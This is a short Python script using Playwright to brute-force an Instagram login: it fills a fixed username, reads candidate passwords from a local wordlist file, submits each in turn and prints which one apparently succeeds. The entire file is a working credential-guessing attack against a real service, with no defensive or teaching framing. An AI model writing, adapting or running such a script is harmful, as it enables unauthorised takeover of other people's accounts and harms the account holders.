import time
from playwright.sync_api import sync_playwright

def run(playwright) -> None:
    browser = playwright.chromium.launch(headless=False)
    context = browser.new_context()
    page = context.new_page()
    page.goto("https://www.instagram.com/")

    # Fill username
    page.fill("input[name='username']", "bandirmacyber")

    # Read passwords from file
    with open(r'C:\Users\Furkan\Desktop\password.txt', "r") as file:
        passwords = file.read().splitlines()

    for password in passwords:
        # Fill password
        page.fill("input[name='password']", password)
        # Click login button
        page.click("button[type='submit']")
        time.sleep(3)  # Wait for a while

        # Check if logged in successfully
        if page.url != "https://www.instagram.com/":
            print(f"Login successful with password: {password}")
            break
        else:
            print(f"Login unsuccessful with password: {password}")
            # Clear password field
            page.fill("input[name='password']", "")
    context.close()
    browser.close()

with sync_playwright() as playwright:
    run(playwright)
